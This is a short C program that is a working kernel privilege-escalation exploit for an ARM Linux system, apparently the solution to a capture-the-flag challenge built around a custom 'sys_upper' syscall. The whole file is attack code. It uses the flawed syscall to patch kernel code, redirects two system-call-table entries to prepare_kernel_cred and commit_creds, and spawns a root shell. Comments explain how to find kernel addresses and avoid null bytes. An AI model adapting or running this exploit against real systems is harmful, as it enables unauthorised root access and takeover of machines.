#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>

#define SYS_UPPER 223
#define SYS_CALL_TABLE 0x8000e348

unsigned int **sct;

int main()
{
    // use commit_creds(prepare_kernel_cred(0)) to get root privilege
    sct = (unsigned int **)SYS_CALL_TABLE;
    syscall(SYS_UPPER, "\x05\x50\xa0\xe1\x05\x50\xa0\xe1\x05\x50\xa0\xe1", 0x8003f560); // overwrite 0x8003f560 to \x05\x50\xa0\xe1 (mov r5, r5)

    // overwrite syscall number 12 to 0x8003f924 (prepare_kernel_cred) use `cat /proc/kallsyms | grep prepare_kernel_cred` to find it
    syscall(SYS_UPPER, "\x24\xf9\x03\x80", &sct[12]);

    // overwrite syscall number 10 to 0x8003f560 (commit_creds - c) use `cat /proc/kallsyms | grep commit_creds` to find it
    // because commit_creds is at 0x8003f56c and 0x6c will be -0x20 by sys_upper so start from 0x60 and put 12 byte mov r5, r5
    // NOP is \x00 on ARM but in sys_upper \x00 will make it stop copy because of strlen so use mov r5, r5 to prevent null byte
    syscall(SYS_UPPER, "\x60\xf5\x03\x80", &sct[10]);
    
    syscall(10, syscall(12, 0)); // get root privilege
    system("/bin/sh");
    return 0;
}